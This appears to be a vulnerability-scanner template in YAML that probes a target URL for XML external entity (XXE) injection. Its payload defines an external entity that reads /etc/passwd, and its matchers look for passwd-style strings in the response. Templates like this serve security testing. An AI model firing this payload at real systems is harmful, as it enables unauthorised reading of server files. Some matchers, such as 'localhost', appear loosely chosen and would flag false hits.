id: xxe2-094
name: 'XXE file read in payload'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via payload'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      payload:
        - '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
